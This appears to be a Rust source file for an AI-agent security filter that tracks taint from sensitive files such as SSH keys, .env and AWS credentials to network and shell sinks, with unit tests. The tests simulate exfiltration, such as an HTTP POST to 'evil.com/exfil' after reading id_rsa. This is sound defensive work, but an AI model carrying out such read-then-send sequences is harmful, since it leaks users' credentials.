// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Taint propagation tracking filter for data flow analysis.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::types::{FilterResult, Severity, TaintLevel, ToolCallContext, ToolCallType};
use chrono::{DateTime, Utc};
use serde_json::json;
use std::collections::HashMap;
// NOTE(M-4): std::sync::Mutex is intentionally used here instead of
// tokio::sync::Mutex because the lock is never held across .await points.
// All lock acquisitions are scoped to synchronous blocks within the async
// evaluate() method, making std::sync::Mutex the more efficient choice.
use std::sync::Mutex;
use std::time::Duration;

/// Default time-to-live for taint registry entries. Entries older than this
/// are evicted on next access to prevent unbounded memory growth (M-2).
const DEFAULT_TAINT_TTL: Duration = Duration::from_secs(3600); // 1 hour

/// An entry in the taint registry, recording level and when it was registered.
#[derive(Debug, Clone)]
struct TaintEntry {
    level: TaintLevel,
    registered_at: DateTime<Utc>,
}

/// Filter that tracks information flow taint to detect when data
/// from sensitive sources flows to potentially dangerous sinks.
///
/// Runs in Phase 3 (Context) because taint tracking requires
/// accumulated session state across multiple calls.
///
/// When a file is read from a sensitive source (e.g., `.env`, `.ssh/`),
/// the path is marked with a taint level. When a subsequent call sends
/// data to a network sink (HTTP request) or shell command, the filter
/// checks if any currently tainted data is involved and scores accordingly.
///
/// Scoring:
/// - `+3.0` tainted data flowing to a medium-risk sink (shell exec)
/// - `+4.0` tainted data flowing to a high-risk sink (HTTP POST/PUT)
/// - `+5.0` highly tainted data flowing to any network sink
/// - `+1.5` proximity bonus: network connection within 30s of a sensitive
///   file read, with no active taint chain (weaker temporal correlation signal)
pub struct TaintFilter {
    taint_registry: Mutex<HashMap<String, TaintEntry>>,
    sensitive_sources: Vec<String>,
    /// Time-to-live for taint entries; entries older than this are evicted.
    taint_ttl: Duration,
    /// Timestamp of the most recent sensitive file access per conversation scope.
    /// Used for timing-proximity scoring: a network connection shortly after a
    /// sensitive file read gets a score bonus even without a full taint chain.
    recent_sensitive_read: Mutex<HashMap<String, DateTime<Utc>>>,
}

impl TaintFilter {
    pub fn new(sensitive_sources: Vec<String>) -> Self {
        Self {
            taint_registry: Mutex::new(HashMap::new()),
            sensitive_sources,
            taint_ttl: DEFAULT_TAINT_TTL,
            recent_sensitive_read: Mutex::new(HashMap::new()),
        }
    }

    /// Create a filter with default sensitive source patterns.
    pub fn with_defaults() -> Self {
        let sensitive_sources = vec![
            ".env".to_string(),
            ".ssh".to_string(),
            "credentials".to_string(),
            "secrets".to_string(),
            ".aws".to_string(),
            ".gnupg".to_string(),
            "id_rsa".to_string(),
            "id_ed25519".to_string(),
            "private_key".to_string(),
            ".kube/config".to_string(),
            "token".to_string(),
            "passwd".to_string(),
            "shadow".to_string(),
        ];
        Self::new(sensitive_sources)
    }

    /// Determine the taint level for a given path based on sensitive source patterns.
    ///
    /// Uses the `sensitive_sources` list to determine if a path is sensitive,
    /// then classifies the taint level based on the specific pattern matched.
    fn classify_source(&self, path: &str) -> TaintLevel {
        let path_lower = path.to_lowercase();

        // Only consider paths that match at least one sensitive source pattern.
        let matches_any = self
            .sensitive_sources
            .iter()
            .any(|pat| path_lower.contains(&pat.to_lowercase()));

        if !matches_any {
            return TaintLevel::None;
        }

        // High taint: SSH keys, private keys, shadow file.
        let high_patterns = [".ssh", "id_rsa", "id_ed25519", "private_key", "shadow"];
        for pat in &high_patterns {
            if path_lower.contains(pat) {
                return TaintLevel::High;
            }
        }

        // Medium taint: environment files, cloud credentials.
        let medium_patterns = [
            ".env",
            ".aws",
            "credentials",
            "secrets",
            ".gnupg",
            ".kube/config",
        ];
        for pat in &medium_patterns {
            if path_lower.contains(pat) {
                return TaintLevel::Medium;
            }
        }

        // Any other sensitive source match is low taint.
        TaintLevel::Low
    }

    /// Build the taint registry key for a path, scoped by conversation when present.
    ///
    /// Conversation-scoped entries use a NUL byte (`\x00`) as separator so that
    /// conversation IDs containing colons or slashes don't collide with paths.
    fn registry_key(ctx: &ToolCallContext, path: &str) -> String {
        match &ctx.conversation_id {
            Some(conv_id) => format!("{}\x00{}", conv_id, path),
            None => path.to_string(),
        }
    }

    /// Return true if a registry key belongs to the given context's conversation scope.
    fn key_matches_context(key: &str, ctx: &ToolCallContext) -> bool {
        match &ctx.conversation_id {
            Some(conv_id) => {
                let prefix = format!("{}\x00", conv_id);
                key.starts_with(prefix.as_str())
            }
            None => !key.contains('\x00'),
        }
    }

    /// Extract the raw path portion from a registry key (strips the conversation prefix if any).
    fn path_from_key(key: &str) -> &str {
        match key.find('\x00') {
            Some(pos) => &key[pos + 1..],
            None => key,
        }
    }

    /// Return the conversation scope key for `recent_sensitive_read`.
    /// Uses the conversation_id if present, otherwise an empty string.
    fn scope_key(ctx: &ToolCallContext) -> String {
        ctx.conversation_id.clone().unwrap_or_default()
    }

    /// Evict taint entries older than the TTL. Called before reads.
    fn evict_stale_entries(registry: &mut HashMap<String, TaintEntry>, ttl: Duration) {
        let ttl_chrono = chrono::Duration::from_std(ttl).unwrap_or(chrono::Duration::hours(1));
        let cutoff = Utc::now() - ttl_chrono;
        registry.retain(|_, entry| entry.registered_at >= cutoff);
    }

    /// Check if the context's source_taint or any registered taint applies.
    fn get_effective_taint(&self, ctx: &ToolCallContext) -> TaintLevel {
        // First check the context-level source taint.
        if ctx.source_taint != TaintLevel::None {
            return ctx.source_taint;
        }

        // Check the taint registry for any tainted paths in the session.
        // Evict stale entries first (M-2: TTL-based eviction).
        let mut registry = self.taint_registry.lock().expect("lock poisoned");
        Self::evict_stale_entries(&mut registry, self.taint_ttl);

        if registry.is_empty() {
            return TaintLevel::None;
        }

        // Return the highest taint level from entries belonging to this conversation scope.
        let mut highest = TaintLevel::None;
        for (key, entry) in registry.iter() {
            if Self::key_matches_context(key, ctx) && taint_ord(&entry.level) > taint_ord(&highest)
            {
                highest = entry.level;
            }
        }
        highest
    }

    /// Register a path as tainted in the registry, scoped by conversation when present.
    fn register_taint(&self, ctx: &ToolCallContext, path: &str, level: TaintLevel) {
        if level != TaintLevel::None {
            let key = Self::registry_key(ctx, path);
            let mut registry = self.taint_registry.lock().expect("lock poisoned");
            registry.insert(
                key,
                TaintEntry {
                    level,
                    registered_at: Utc::now(),
                },
            );
        }
    }

    /// Get the number of tainted paths in the registry (after eviction).
    pub fn tainted_path_count(&self) -> usize {
        let mut registry = self.taint_registry.lock().expect("lock poisoned");
        Self::evict_stale_entries(&mut registry, self.taint_ttl);
        registry.len()
    }

    /// Collect the set of active taint source categories from the registry,
    /// scoped to the current conversation.
    fn active_source_categories(&self, ctx: &ToolCallContext) -> Vec<String> {
        let mut registry = self.taint_registry.lock().expect("lock poisoned");
        Self::evict_stale_entries(&mut registry, self.taint_ttl);
        let mut categories: Vec<String> = registry
            .keys()
            .filter(|key| Self::key_matches_context(key, ctx))
            .filter_map(|key| classify_source_category(Self::path_from_key(key)).map(String::from))
            .collect();
        categories.sort();
        categories.dedup();
        categories
    }
}

/// Classify a path into a named taint source category for meta-rule matching.
///
/// Returns `None` for paths that don't match any known category.
fn classify_source_category(path: &str) -> Option<&'static str> {
    let path_lower = path.to_lowercase();

    // SSH keys and private key material
    let ssh_patterns = [".ssh", "id_rsa", "id_ed25519", "private_key", "shadow"];
    for pat in &ssh_patterns {
        if path_lower.contains(pat) {
            return Some("ssh-key");
        }
    }

    // Environment files and cloud credentials
    let env_patterns = [
        ".env",
        ".aws",
        "credentials",
        "secrets",
        ".gnupg",
        ".kube/config",
    ];
    for pat in &env_patterns {
        if path_lower.contains(pat) {
            return Some("env-file");
        }
    }

    // Any other sensitive path gets a generic category
    Some("sensitive-file")
}

/// Assign a numeric ordering to taint levels for comparison.
fn taint_ord(level: &TaintLevel) -> u8 {
    match level {
        TaintLevel::None => 0,
        TaintLevel::Low => 1,
        TaintLevel::Medium => 2,
        TaintLevel::High => 3,
    }
}

/// Determine if an HTTP method is a high-risk sink.
fn is_high_risk_http_method(method: &str) -> bool {
    matches!(method.to_uppercase().as_str(), "POST" | "PUT" | "PATCH")
}

#[async_trait::async_trait]
impl SecurityFilter for TaintFilter {
    fn name(&self) -> &str {
        "taint"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Context
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        match &ctx.call_type {
            // When reading a file, check if it is a sensitive source and register taint.
            ToolCallType::FileRead { path } => {
                let taint_level = self.classify_source(path);
                self.register_taint(ctx, path, taint_level);
                let mut result = FilterResult::no_match("taint");
                // Stamp source category metadata and update proximity tracker.
                if taint_level != TaintLevel::None {
                    {
                        let key = Self::scope_key(ctx);
                        let mut recent = self.recent_sensitive_read.lock().expect("lock poisoned");
                        recent.insert(key, Utc::now());
                    }
                    if let Some(cat) = classify_source_category(path) {
                        result
                            .metadata
                            .insert("taint_source_category".into(), json!(cat));
                    }
                }
                Ok(result)
            }

            // When making an HTTP request, check for tainted data flowing out.
            ToolCallType::HttpRequest { method, url } => {
                let effective_taint = self.get_effective_taint(ctx);
                let mut result = match effective_taint {
                    TaintLevel::High => FilterResult::matched(
                        "taint",
                        "high-taint-network-sink",
                        5.0,
                        Severity::Critical,
                        format!("Highly tainted data flowing to network sink: {method} {url}"),
                    ),
                    TaintLevel::Medium if is_high_risk_http_method(method) => {
                        FilterResult::matched(
                            "taint",
                            "medium-taint-high-risk-sink",
                            4.0,
                            Severity::Error,
                            format!("Tainted data flowing to high-risk HTTP sink: {method} {url}"),
                        )
                    }
                    TaintLevel::Medium => FilterResult::matched(
                        "taint",
                        "medium-taint-network-sink",
                        3.0,
                        Severity::Warning,
                        format!("Tainted data flowing to network sink: {method} {url}"),
                    ),
                    TaintLevel::Low if is_high_risk_http_method(method) => FilterResult::matched(
                        "taint",
                        "low-taint-high-risk-sink",
                        3.0,
                        Severity::Warning,
                        format!("Low-taint data flowing to high-risk sink: {method} {url}"),
                    ),
                    _ => FilterResult::no_match("taint"),
                };
                if result.matched {
                    let cats = self.active_source_categories(ctx);
                    if !cats.is_empty() {
                        result
                            .metadata
                            .insert("active_taint_sources".into(), json!(cats));
                    }
                }
                // Proximity bonus: if no taint chain fired but a sensitive file was read
                // recently, add a weaker temporal correlation signal.
                if effective_taint == TaintLevel::None {
                    const PROXIMITY_WINDOW: Duration = Duration::from_secs(30);
                    let key = Self::scope_key(ctx);
                    let recent = self.recent_sensitive_read.lock().expect("lock poisoned");
                    if let Some(last_read) = recent.get(&key) {
                        let elapsed = Utc::now().signed_duration_since(*last_read);
                        if elapsed.num_seconds() >= 0
                            && elapsed
                                < chrono::Duration::from_std(PROXIMITY_WINDOW)
                                    .unwrap_or(chrono::Duration::seconds(30))
                        {
                            result.matched = true;
                            result.score = 1.5;
                            result.rule_id = "proximity-sensitive-read".into();
                            result.severity = Severity::Notice;
                            result.message = format!(
                                "HTTP request within 30s of sensitive file read: {method} {url}"
                            );
                        }
                    }
                }
                Ok(result)
            }

            // When executing a shell command or spawning a process, check for tainted data flowing out.
            ToolCallType::ShellExec { .. } | ToolCallType::ProcessSpawn { .. } => {
                let effective_taint = self.get_effective_taint(ctx);
                let mut result = match effective_taint {
                    TaintLevel::High => {
                        let full = ctx.full_command().unwrap_or_default();
                        FilterResult::matched(
                            "taint",
                            "high-taint-shell-sink",
                            5.0,
                            Severity::Critical,
                            format!("Highly tainted data flowing to shell: {full}"),
                        )
                    }
                    TaintLevel::Medium | TaintLevel::Low => {
                        let full = ctx.full_command().unwrap_or_default();
                        FilterResult::matched(
                            "taint",
                            "tainted-shell-sink",
                            3.0,
                            Severity::Warning,
                            format!("Tainted data flowing to shell: {full}"),
                        )
                    }
                    TaintLevel::None => FilterResult::no_match("taint"),
                };
                if result.matched {
                    let cats = self.active_source_categories(ctx);
                    if !cats.is_empty() {
                        result
                            .metadata
                            .insert("active_taint_sources".into(), json!(cats));
                    }
                }
                Ok(result)
            }

            // Network connect is a network sink, similar to HttpRequest.
            ToolCallType::NetConnect { address, port } => {
                let effective_taint = self.get_effective_taint(ctx);
                let mut result = match effective_taint {
                    TaintLevel::High => FilterResult::matched(
                        "taint",
                        "high-taint-network-sink",
                        5.0,
                        Severity::Critical,
                        format!("Highly tainted data flowing to network sink: {address}:{port}"),
                    ),
                    TaintLevel::Medium | TaintLevel::Low => FilterResult::matched(
                        "taint",
                        "tainted-network-sink",
                        3.0,
                        Severity::Warning,
                        format!("Tainted data flowing to network sink: {address}:{port}"),
                    ),
                    TaintLevel::None => FilterResult::no_match("taint"),
                };
                if result.matched {
                    let cats = self.active_source_categories(ctx);
                    if !cats.is_empty() {
                        result
                            .metadata
                            .insert("active_taint_sources".into(), json!(cats));
                    }
                }
                // Proximity bonus: if no taint chain fired but a sensitive file was read
                // recently, add a weaker temporal correlation signal.
                if effective_taint == TaintLevel::None {
                    const PROXIMITY_WINDOW: Duration = Duration::from_secs(30);
                    let key = Self::scope_key(ctx);
                    let recent = self.recent_sensitive_read.lock().expect("lock poisoned");
                    if let Some(last_read) = recent.get(&key) {
                        let elapsed = Utc::now().signed_duration_since(*last_read);
                        if elapsed.num_seconds() >= 0
                            && elapsed
                                < chrono::Duration::from_std(PROXIMITY_WINDOW)
                                    .unwrap_or(chrono::Duration::seconds(30))
                        {
                            result.matched = true;
                            result.score = 1.5;
                            result.rule_id = "proximity-sensitive-read".into();
                            result.severity = Severity::Notice;
                            result.message = format!(
                                "Network connection within 30s of sensitive file read: {address}:{port}"
                            );
                        }
                    }
                }
                Ok(result)
            }

            // File operations track taint through paths.
            ToolCallType::FileWrite { path, .. }
            | ToolCallType::FileAppend { path }
            | ToolCallType::FileDelete { path }
            | ToolCallType::FileChmod { path, .. }
            | ToolCallType::DirCreate { path }
            | ToolCallType::DirList { path } => {
                let taint_level = self.classify_source(path);
                self.register_taint(ctx, path, taint_level);
                Ok(FilterResult::no_match("taint"))
            }

            ToolCallType::FileRename { old_path, new_path } => {
                let taint_level = self.classify_source(old_path);
                self.register_taint(ctx, old_path, taint_level);
                let taint_level = self.classify_source(new_path);
                self.register_taint(ctx, new_path, taint_level);
                Ok(FilterResult::no_match("taint"))
            }

            // Other call types: no taint concern.
            _ => Ok(FilterResult::no_match("taint")),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::ToolCallType;
    use uuid::Uuid;

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    fn make_ctx_with_taint(call_type: ToolCallType, taint: TaintLevel) -> ToolCallContext {
        let mut ctx = ToolCallContext::new("test", call_type, Uuid::new_v4());
        ctx.source_taint = taint;
        ctx
    }

    #[tokio::test]
    async fn test_file_read_registers_taint() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.ssh/id_rsa".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // Reading does not produce a match itself.
        assert!(!result.matched);
        // But the path should be registered as tainted.
        assert_eq!(filter.tainted_path_count(), 1);
    }

    #[tokio::test]
    async fn test_high_taint_to_http_post() {
        let filter = TaintFilter::with_defaults();

        // First, read a sensitive file.
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.ssh/id_rsa".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // Now, make an HTTP POST with the tainted data still in the session.
        let http_ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });
        let result = filter.evaluate(&http_ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 5.0);
        assert_eq!(result.rule_id, "high-taint-network-sink");
    }

    #[tokio::test]
    async fn test_medium_taint_to_http_get() {
        let filter = TaintFilter::with_defaults();

        // Read a .env file (medium taint).
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/app/.env".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // HTTP GET with medium taint.
        let http_ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://example.com/api".into(),
        });
        let result = filter.evaluate(&http_ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 3.0);
        assert_eq!(result.rule_id, "medium-taint-network-sink");
    }

    #[tokio::test]
    async fn test_medium_taint_to_http_post() {
        let filter = TaintFilter::with_defaults();

        // Read a .env file (medium taint).
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/app/.env.production".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // HTTP POST with medium taint should be higher score.
        let http_ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://example.com/upload".into(),
        });
        let result = filter.evaluate(&http_ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 4.0);
        assert_eq!(result.rule_id, "medium-taint-high-risk-sink");
    }

    #[tokio::test]
    async fn test_context_level_taint() {
        let filter = TaintFilter::with_defaults();

        // Create a context with source_taint set directly.
        let ctx = make_ctx_with_taint(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://example.com/api".into(),
            },
            TaintLevel::High,
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 5.0);
    }

    #[tokio::test]
    async fn test_no_taint_returns_no_match() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://example.com/api".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_non_sensitive_file_read_no_taint() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/tmp/readme.txt".into(),
        });
        let _ = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(filter.tainted_path_count(), 0);
    }

    #[tokio::test]
    async fn test_tainted_data_to_shell() {
        let filter = TaintFilter::with_defaults();

        // Read credentials file.
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.aws/credentials".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // Execute shell command.
        let shell_ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec!["https://example.com".into()],
        });
        let result = filter.evaluate(&shell_ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "tainted-shell-sink");
        assert_eq!(result.score, 3.0);
    }

    #[tokio::test]
    async fn test_dir_list_returns_no_match() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::DirList {
            path: "/home/user".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_file_read_env_stamps_source_category() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/app/.env".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(
            result.metadata.get("taint_source_category"),
            Some(&serde_json::json!("env-file"))
        );
    }

    #[tokio::test]
    async fn test_file_read_ssh_stamps_source_category() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.ssh/id_rsa".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(
            result.metadata.get("taint_source_category"),
            Some(&serde_json::json!("ssh-key"))
        );
    }

    #[tokio::test]
    async fn test_file_read_non_sensitive_no_category() {
        let filter = TaintFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/tmp/readme.txt".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.metadata.get("taint_source_category").is_none());
    }

    #[tokio::test]
    async fn test_http_post_with_taint_stamps_active_sources() {
        let filter = TaintFilter::with_defaults();

        // Read .env to register taint
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/app/.env".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // HTTP POST should include active_taint_sources
        let http_ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://example.com/upload".into(),
        });
        let result = filter.evaluate(&http_ctx).await.unwrap();
        assert!(result.matched);
        let sources = result.metadata.get("active_taint_sources").unwrap();
        let arr = sources.as_array().unwrap();
        assert!(arr.contains(&serde_json::json!("env-file")));
    }

    #[test]
    fn test_classify_source_category_vocabulary() {
        assert_eq!(classify_source_category("/app/.env"), Some("env-file"));
        assert_eq!(
            classify_source_category("/app/.env.production"),
            Some("env-file")
        );
        assert_eq!(
            classify_source_category("/home/.aws/credentials"),
            Some("env-file")
        );
        assert_eq!(
            classify_source_category("/home/.ssh/id_rsa"),
            Some("ssh-key")
        );
        assert_eq!(classify_source_category("/etc/shadow"), Some("ssh-key"));
        assert_eq!(
            classify_source_category("/home/.gnupg/key"),
            Some("env-file")
        );
        assert_eq!(
            classify_source_category("/app/token.json"),
            Some("sensitive-file")
        );
    }

    #[tokio::test]
    async fn test_taint_ttl_eviction() {
        // M-2: Entries older than the TTL should be evicted.
        let mut filter = TaintFilter::with_defaults();
        // Set a very short TTL for testing (0 seconds = immediately stale).
        filter.taint_ttl = Duration::from_secs(0);

        // Read a sensitive file to register taint.
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.ssh/id_rsa".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // The taint entry was just registered, but with a 0-second TTL
        // it should be evicted on the next access.
        // Note: because of timing, the entry was registered at Utc::now()
        // and the cutoff is also Utc::now(), entries at exactly the cutoff
        // survive (>=). We need to wait a tiny bit.
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;

        // After eviction, the taint count should be 0.
        assert_eq!(filter.tainted_path_count(), 0);

        // An HTTP POST should no longer fire the full taint chain (taint was evicted).
        // The proximity bonus may still fire since recent_sensitive_read is within 30s,
        // but the taint chain rule (high-taint-network-sink) should not appear.
        let http_ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });
        let result = filter.evaluate(&http_ctx).await.unwrap();
        assert_ne!(
            result.rule_id, "high-taint-network-sink",
            "taint chain should be evicted"
        );
        assert!(
            result.score < 5.0,
            "full taint score should not fire after eviction"
        );
    }

    fn make_ctx_with_conv(call_type: ToolCallType, conv_id: &str) -> ToolCallContext {
        let mut ctx = ToolCallContext::new("test", call_type, Uuid::new_v4());
        ctx.conversation_id = Some(conv_id.to_string());
        ctx
    }

    #[tokio::test]
    async fn test_conversation_taint_isolation() {
        let filter = TaintFilter::with_defaults();

        // conv-a reads a sensitive file — registers taint under "conv-a" scope.
        let read_ctx = make_ctx_with_conv(
            ToolCallType::FileRead {
                path: "/home/user/.ssh/id_rsa".into(),
            },
            "conv-a",
        );
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // conv-b makes a network connection — must NOT see conv-a's taint.
        let net_ctx = make_ctx_with_conv(
            ToolCallType::NetConnect {
                address: "93.184.216.34".into(),
                port: 443,
            },
            "conv-b",
        );
        let result = filter.evaluate(&net_ctx).await.unwrap();
        assert!(!result.matched, "conv-b should not inherit conv-a taint");
        assert_eq!(result.score, 0.0);
    }

    #[tokio::test]
    async fn test_same_conversation_taint_propagates() {
        let filter = TaintFilter::with_defaults();

        // conv-a reads a sensitive file.
        let read_ctx = make_ctx_with_conv(
            ToolCallType::FileRead {
                path: "/home/user/.ssh/id_rsa".into(),
            },
            "conv-a",
        );
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // conv-a makes a network connection — SHOULD see its own taint.
        let net_ctx = make_ctx_with_conv(
            ToolCallType::NetConnect {
                address: "93.184.216.34".into(),
                port: 443,
            },
            "conv-a",
        );
        let result = filter.evaluate(&net_ctx).await.unwrap();
        assert!(
            result.matched,
            "conv-a taint should propagate within same conversation"
        );
        assert!(result.score > 0.0);
    }

    /// Proximity bonus fires when taint was evicted (short TTL) but the sensitive
    /// file read is still within the 30-second window.
    #[tokio::test]
    async fn test_proximity_boost_fires_within_window() {
        let mut filter = TaintFilter::with_defaults();
        // Use a 0-second TTL so taint evicts immediately after the first access.
        filter.taint_ttl = Duration::from_secs(0);

        // Read a sensitive file — registers taint AND updates recent_sensitive_read.
        let read_ctx = make_ctx(ToolCallType::FileRead {
            path: "/home/user/.ssh/id_rsa".into(),
        });
        let _ = filter.evaluate(&read_ctx).await.unwrap();

        // Wait just long enough for the taint entry to be stale (TTL = 0s).
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;

        // Confirm taint is now evicted.
        assert_eq!(
            filter.tainted_path_count(),
            0,
            "taint entry should be evicted"
        );

        // NetConnect with no active taint but recent sensitive read → proximity bonus.
        let net_ctx = make_ctx(ToolCallType::NetConnect {
            address: "evil.com".into(),
            port: 443,
        });
        let result = filter.evaluate(&net_ctx).await.unwrap();
        assert!(result.matched, "proximity bonus should fire within window");
        assert_eq!(result.score, 1.5, "proximity bonus is +1.5");
        assert_eq!(result.rule_id, "proximity-sensitive-read");
    }

    /// Proximity bonus does NOT fire when the sensitive file read was more than
    /// 30 seconds ago.
    #[tokio::test]
    async fn test_proximity_boost_does_not_fire_outside_window() {
        let filter = TaintFilter::with_defaults();

        // Directly insert a stale entry (35 seconds ago) into recent_sensitive_read.
        {
            let mut recent = filter.recent_sensitive_read.lock().expect("lock poisoned");
            recent.insert(
                String::new(), // no conversation_id → scope key is ""
                Utc::now() - chrono::Duration::seconds(35),
            );
        }

        // NetConnect — taint registry is empty, and recent read is outside window.
        let net_ctx = make_ctx(ToolCallType::NetConnect {
            address: "example.com".into(),
            port: 443,
        });
        let result = filter.evaluate(&net_ctx).await.unwrap();
        assert!(
            !result.matched,
            "proximity bonus must not fire outside the 30s window"
        );
        assert_eq!(result.score, 0.0);
    }
}
